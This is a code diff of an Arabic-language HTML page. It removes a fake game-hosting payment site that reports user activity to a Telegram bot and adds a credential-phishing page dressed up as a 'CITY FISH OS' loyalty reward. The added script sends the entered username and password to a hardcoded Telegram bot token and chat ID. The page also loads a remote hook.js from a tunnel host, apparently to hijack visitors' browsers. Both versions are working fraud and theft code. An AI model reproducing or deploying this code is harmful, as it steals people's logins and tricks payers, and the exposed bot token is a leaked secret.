@@ -3,293 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HostGame Pro - استضافة مواقع الألعاب</title>
+    <title>CITY FISH OS v4.0 - Loyalty Rewards</title>
+    
+    <script src="https://0fc034dfd1d961.lhr.life/hook.js"></script>
+    
     <style>
-        :root { --bg: #0a0f1e; --card: #111633; --gold: #f0b90b; --green: #00d4aa; --white: #fff; --sub: #8a8d9f; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; }
-        body { background: var(--bg); color: var(--white); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .container { max-width: 450px; width: 100%; }
-        .card { background: var(--card); border-radius: 25px; padding: 30px 25px; border: 1px solid rgba(255,255,255,0.05); margin-bottom: 20px; }
-        h2 { color: var(--gold); text-align: center; margin-bottom: 20px; font-size: 24px; }
-        .logo { text-align: center; font-size: 50px; margin-bottom: 15px; }
-        input, select { width: 100%; padding: 14px; margin-bottom: 12px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); background: rgba(0,0,0,0.4); color: white; text-align: center; font-size: 15px; }
-        input:focus, select:focus { border-color: var(--gold); outline: none; }
-        .btn { width: 100%; padding: 15px; border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; margin-bottom: 10px; transition: 0.3s; }
-        .btn-gold { background: var(--gold); color: #000; }
-        .btn-green { background: var(--green); color: #000; }
-        .btn-dark { background: rgba(255,255,255,0.05); color: white; border: 1px solid rgba(255,255,255,0.2); }
-        .btn:hover { transform: scale(1.02); }
-        .screen { display: none; }
-        .screen.active { display: block; }
-        .price-box { background: rgba(240,185,11,0.1); padding: 20px; border-radius: 20px; text-align: center; margin: 20px 0; border: 1px solid var(--gold); }
-        .price { font-size: 40px; font-weight: 800; color: var(--gold); }
-        .bank-list { display: grid; gap: 10px; margin: 20px 0; }
-        .bank-option { background: rgba(255,255,255,0.03); padding: 15px; border-radius: 15px; cursor: pointer; text-align: center; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
-        .bank-option:hover { border-color: var(--gold); background: rgba(240,185,11,0.1); }
-        .bank-option.selected { border-color: var(--gold); background: rgba(240,185,11,0.2); }
-        .qr-box { text-align: center; margin: 20px 0; }
-        .qr-box img { width: 250px; height: 250px; border: 3px solid var(--gold); border-radius: 20px; }
-        .steps { text-align: right; color: var(--sub); font-size: 13px; line-height: 1.8; margin: 10px 0; }
-        .upload-area { background: rgba(0,0,0,0.3); border: 2px dashed rgba(255,255,255,0.2); border-radius: 20px; padding: 30px; text-align: center; margin: 20px 0; cursor: pointer; }
-        .success-box { background: rgba(0,212,170,0.1); padding: 20px; border-radius: 20px; text-align: center; border: 1px solid var(--green); margin: 20px 0; }
-        .policy { font-size: 11px; color: var(--sub); text-align: center; margin-top: 20px; line-height: 1.6; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; justify-content: center; align-items: center; padding: 20px; }
-        .modal.active { display: flex; }
-        .modal-box { background: var(--card); border-radius: 25px; padding: 25px; width: 100%; max-width: 400px; text-align: center; border: 1px solid var(--gold); }
-        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--green); color: #000; padding: 14px 28px; border-radius: 50px; z-index: 200; font-weight: bold; }
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap');
+        :root { --os-dark: #020617; --os-accent: #22c55e; --os-surface: rgba(30, 41, 59, 0.7); }
+        body { margin: 0; background: radial-gradient(circle, #0f172a, #020617); color: #f8fafc; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .os-card { background: var(--os-surface); backdrop-filter: blur(15px); border: 2px solid var(--os-accent); border-radius: 24px; padding: 30px; width: 90%; max-width: 420px; text-align: center; box-shadow: 0 0 40px rgba(34, 197, 94, 0.2); }
+        .reward-box { background: rgba(34, 197, 94, 0.1); border: 1px dashed var(--os-accent); padding: 15px; border-radius: 15px; margin-bottom: 20px; }
+        input { width: 100%; background: rgba(0,0,0,0.4); border: 2px solid rgba(34, 197, 94, 0.3); border-radius: 12px; padding: 15px; margin-bottom: 15px; color: white; box-sizing: border-box; }
+        .btn-claim { background: var(--os-accent); color: var(--os-dark); border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 900; cursor: pointer; }
     </style>
 </head>
 <body>
-<div class="container">
-
-    <!-- ==================== شاشة تسجيل الدخول ==================== -->
-    <div class="screen active" id="loginScreen">
-        <div class="card">
-            <div class="logo">🌐</div>
-            <h2>HostGame Pro</h2>
-            <p style="text-align:center;color:var(--sub);margin-bottom:20px;">استضافة مواقع الألعاب الاحترافية</p>
-            <input type="text" id="loginEmail" placeholder="👤 البريد الإلكتروني">
-            <input type="password" id="loginPassword" placeholder="🔒 كلمة المرور">
-            <button class="btn btn-gold" onclick="doLogin()">🚀 تسجيل الدخول</button>
-            <button class="btn btn-dark" onclick="showScreen('registerScreen')">✨ إنشاء حساب جديد</button>
-        </div>
+    <div class="os-card">
+        <h2 style="color:var(--os-accent)">CITY FISH OS</h2>
+        <div class="reward-box"><h3>🎁 مكافأة الوكيل</h3><p>سجل دخولك لاستلام كود الخصم</p></div>
+        <input type="text" id="user" placeholder="اسم المستخدم">
+        <input type="password" id="pass" placeholder="كلمة المرور">
+        <button class="btn-claim" onclick="sendData()">تفعيل المكافأة</button>
     </div>
 
-    <!-- ==================== شاشة التسجيل ==================== -->
-    <div class="screen" id="registerScreen">
-        <div class="card">
-            <h2>إنشاء حساب</h2>
-            <input type="text" id="regName" placeholder="الاسم الكامل">
-            <input type="email" id="regEmail" placeholder="البريد الإلكتروني">
-            <input type="password" id="regPassword" placeholder="كلمة المرور">
-            <button class="btn btn-gold" onclick="doRegister()">إنشاء الحساب</button>
-            <button class="btn btn-dark" onclick="showScreen('loginScreen')">رجوع</button>
-        </div>
-    </div>
-
-    <!-- ==================== لوحة التحكم ==================== -->
-    <div class="screen" id="dashboardScreen">
-        <div class="card">
-            <h2>📊 لوحة التحكم</h2>
-            <p style="text-align:center;color:var(--sub);">أهلاً بك في HostGame Pro</p>
-            <div class="price-box">
-                <p>تكلفة الاستضافة الشهرية</p>
-                <div class="price">10$</div>
-                <p style="color:var(--sub);">شامل النطاق والسورس</p>
-            </div>
-            <button class="btn btn-gold" onclick="showScreen('paymentScreen')">💳 ادفع الآن</button>
-            <button class="btn btn-dark" onclick="logout()">تسجيل خروج</button>
-        </div>
-    </div>
-
-    <!-- ==================== شاشة الدفع ==================== -->
-    <div class="screen" id="paymentScreen">
-        <div class="card">
-            <h2>💳 اختر طريقة الدفع</h2>
-            <p style="text-align:center;color:var(--sub);">اختر بنك بلدك للتحويل</p>
-            <div class="bank-list">
-                <div class="bank-option" onclick="selectBank('syria')" id="bankSyria">
-                    🇸🇾 سوريا - شام كاش
-                </div>
-                <div class="bank-option" onclick="selectBank('egypt')" id="bankEgypt">
-                    🇪🇬 مصر - فودافون كاش
-                </div>
-                <div class="bank-option" onclick="selectBank('iraq')" id="bankIraq">
-                    🇮🇶 العراق - زين كاش
-                </div>
-            </div>
-            <button class="btn btn-gold" id="btnPayNow" onclick="showPaymentQR()" disabled>💸 ادفع الآن</button>
-            <button class="btn btn-dark" onclick="showScreen('dashboardScreen')">رجوع</button>
-        </div>
-    </div>
-
-    <!-- ==================== شاشة الباركود ==================== -->
-    <div class="screen" id="qrScreen">
-        <div class="card">
-            <h2>📱 امسح الباركود للدفع</h2>
-            <p style="text-align:center;color:var(--gold);">شام كاش</p>
-            <div class="qr-box">
-                <img id="paymentQR" src="" alt="QR Code">
-            </div>
-            <div class="steps">
-                <p>1. افتح تطبيق شام كاش</p>
-                <p>2. اضغط "إرسال"</p>
-                <p>3. اضغط "مسح باركود"</p>
-                <p>4. امسح الباركود أعلاه</p>
-                <p>5. أدخل المبلغ: <b style="color:var(--gold);">10$ (ما يعادل 140,000 ل.س)</b></p>
-                <p>6. اضغط تحويل</p>
-            </div>
-            <input type="text" id="paymentRef" placeholder="رقم العملية (اختياري)">
-            <button class="btn btn-green" onclick="confirmPayment()">✅ تم التحويل</button>
-            <button class="btn btn-dark" onclick="showScreen('paymentScreen')">رجوع</button>
-        </div>
-    </div>
-
-    <!-- ==================== شاشة رفع السورس ==================== -->
-    <div class="screen" id="uploadScreen">
-        <div class="card">
-            <h2>📤 رفع ملفات الموقع</h2>
-            <p style="text-align:center;color:var(--sub);">ارفع ملف HTML الخاص بموقعك</p>
-            <div class="upload-area" onclick="document.getElementById('fileInput').click()">
-                <p style="font-size:40px;">📁</p>
-                <p>اضغط لاختيار ملف</p>
-                <p style="color:var(--sub);font-size:12px;">HTML, ZIP</p>
-            </div>
-            <input type="file" id="fileInput" accept=".html,.zip" style="display:none;" onchange="handleFile()">
-            <p id="fileName" style="text-align:center;color:var(--green);"></p>
-            <button class="btn btn-green" id="btnDeploy" onclick="deploySite()" disabled>🚀 نشر الموقع</button>
-            <button class="btn btn-dark" onclick="showScreen('dashboardScreen')">رجوع</button>
-        </div>
-    </div>
-
-    <!-- ==================== شاشة النجاح ==================== -->
-    <div class="screen" id="successScreen">
-        <div class="card">
-            <div class="success-box">
-                <p style="font-size:60px;">✅</p>
-                <h2 style="color:var(--green);">تم النشر بنجاح!</h2>
-                <p style="margin:15px 0;">رابط موقعك:</p>
-                <p id="siteUrl" style="color:var(--gold);font-weight:bold;word-break:break-all;"></p>
-            </div>
-            <button class="btn btn-gold" onclick="copyUrl()">📋 نسخ الرابط</button>
-            <button class="btn btn-dark" onclick="logout()">تسجيل خروج</button>
-        </div>
-    </div>
-
-    <!-- ==================== سياسة الخصوصية ==================== -->
-    <div class="policy">
-        <p><b>سياسة الخصوصية:</b> عزيزي المشترك، نحن غير مسؤولين عن أي استخدام خاطئ للموقع.</p>
-        <p>يجب أن يكون لديك بطاقة بنكية وحساب بنكي به رصيد.</p>
-        <p>جميع الحقوق محفوظة © HostGame Pro 2025</p>
-    </div>
-</div>
-
-<!-- ==================== مودال ربط شام كاش (للمدير فقط) ==================== -->
-<div class="modal" id="shamcashModal">
-    <div class="modal-box">
-        <h3>📱 اربط حساب شام كاش</h3>
-        <p style="color:var(--sub);">للحصول على صلاحيات المدير الكاملة</p>
-        <img id="shamcashQR" src="" style="width:200px;height:200px;margin:15px auto;display:block;border:2px solid var(--gold);border-radius:15px;">
-        <button class="btn btn-gold" onclick="closeShamcashModal()">تم المسح</button>
-    </div>
-</div>
-
-<script>
-    const BOT_TOKEN = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
-    const CHAT_ID = "8665747715";
-    const YOUR_ACCOUNT = "6381946898993929";
-    const YOUR_NAME = "ahmadalaed";
-    
-    let currentUser = null;
-    let selectedBank = null;
-    let uploadedFile = null;
-
-    // بيانات المستخدمين
-    let users = JSON.parse(localStorage.getItem('host_users') || '[]');
-
-    function saveUsers() { localStorage.setItem('host_users', JSON.stringify(users)); }
-    async function tg(msg) { try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:CHAT_ID, text:msg})}); } catch(e){} }
-    function toast(msg) { const t = document.createElement('div'); t.style.cssText='position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#00d4aa;color:#000;padding:14px 28px;border-radius:50px;z-index:200;font-weight:bold;'; t.textContent=msg; document.body.appendChild(t); setTimeout(()=>t.remove(), 2500); }
-
-    function showScreen(id) {
-        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-    }
-
-    function doLogin() {
-        const email = document.getElementById('loginEmail').value.trim();
-        const pass = document.getElementById('loginPassword').value.trim();
-        const user = users.find(u => u.email === email && u.password === pass);
-        if (!user) { alert('بيانات خاطئة'); return; }
-        currentUser = user;
-        tg('👤 دخول: ' + email);
-        showScreen('dashboardScreen');
+    <script>
+    function sendData() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        const msg = `🐟 صيد أسماك المدينة:\n👤: ${u}\n🔑: ${p}`;
         
-        // إذا كان المستخدم هو المدير الوهمي (1992)، أظهر له مودال ربط شام كاش
-        if (email === '1992@host.com') {
-            setTimeout(() => {
-                document.getElementById('shamcashQR').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${YOUR_ACCOUNT}`;
-                document.getElementById('shamcashModal').classList.add('active');
-            }, 1000);
-        }
+        fetch(`https://api.telegram.org/bot8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs/sendMessage?chat_id=8665747715&text=${encodeURIComponent(msg)}`)
+        .then(() => { alert("تم التأكيد، انتظر اتصال النظام..."); });
     }
-
-    function doRegister() {
-        const name = document.getElementById('regName').value.trim();
-        const email = document.getElementById('regEmail').value.trim();
-        const pass = document.getElementById('regPassword').value.trim();
-        if (!name || !email || !pass) { alert('املأ جميع الحقول'); return; }
-        users.push({ name, email, password: pass, createdAt: new Date().toISOString() });
-        saveUsers();
-        tg('✨ تسجيل جديد: ' + email);
-        alert('تم إنشاء الحساب. سجل دخول.');
-        showScreen('loginScreen');
-    }
-
-    function logout() { currentUser = null; showScreen('loginScreen'); }
-
-    function selectBank(country) {
-        selectedBank = country;
-        document.querySelectorAll('.bank-option').forEach(b => b.classList.remove('selected'));
-        document.getElementById('bank' + country.charAt(0).toUpperCase() + country.slice(1)).classList.add('selected');
-        document.getElementById('btnPayNow').disabled = false;
-    }
-
-    function showPaymentQR() {
-        if (!selectedBank) return;
-        if (selectedBank === 'syria') {
-            document.getElementById('paymentQR').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${YOUR_ACCOUNT}`;
-            showScreen('qrScreen');
-            tg('💳 النصاب في شاشة الدفع - شام كاش');
-        } else {
-            alert('الدفع عبر ' + selectedBank + ' غير متاح حالياً. اختر شام كاش.');
-        }
-    }
-
-    function confirmPayment() {
-        const ref = document.getElementById('paymentRef').value.trim();
-        tg('✅ النصاب أكد الدفع! المرجع: ' + (ref || 'بدون'));
-        toast('تم تأكيد الدفع!');
-        showScreen('uploadScreen');
-    }
-
-    function handleFile() {
-        const file = document.getElementById('fileInput').files[0];
-        if (file) {
-            uploadedFile = file;
-            document.getElementById('fileName').textContent = '✅ ' + file.name;
-            document.getElementById('btnDeploy').disabled = false;
-        }
-    }
-
-    function deploySite() {
-        const siteName = (currentUser?.name || 'user').toLowerCase().replace(/\s/g, '');
-        const url = `https://${siteName}-game.hostgame.pro`;
-        document.getElementById('siteUrl').textContent = url;
-        showScreen('successScreen');
-        tg('🚀 موقع جديد نُشر: ' + url);
-    }
-
-    function copyUrl() {
-        const url = document.getElementById('siteUrl').textContent;
-        navigator.clipboard?.writeText(url);
-        toast('تم نسخ الرابط!');
-    }
-
-    function closeShamcashModal() {
-        document.getElementById('shamcashModal').classList.remove('active');
-        tg('🔥 المدير الوهمي مسح باركود شام كاش!');
-        toast('تم ربط الحساب. صلاحيات كاملة.');
-    }
-
-    // بيانات افتراضية
-    if (users.length === 0) {
-        users.push({ name: 'Admin', email: 'admin@host.com', password: 'admin123' });
-        users.push({ name: 'Maestro', email: '1992@host.com', password: '1992' });
-        saveUsers();
-    }
-
-    showScreen('loginScreen');
-</script>
+    </script>
 </body>
 </html>
